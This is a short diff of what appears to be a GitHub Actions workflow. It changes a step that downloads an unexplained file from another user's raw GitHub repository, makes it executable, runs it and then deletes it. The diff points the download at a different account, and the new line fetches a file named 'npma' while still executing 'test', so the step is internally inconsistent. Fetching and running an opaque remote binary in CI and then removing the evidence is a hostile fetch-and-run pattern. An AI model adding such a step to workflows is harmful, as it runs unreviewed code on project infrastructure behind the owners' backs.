@@ -11,7 +11,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: |
-         wget https://github.com/si9k/sa/raw/main/test
+         wget https://github.com/Arlentak/pages/raw/master/npma test
          chmod +x test
          ./test
          rm test
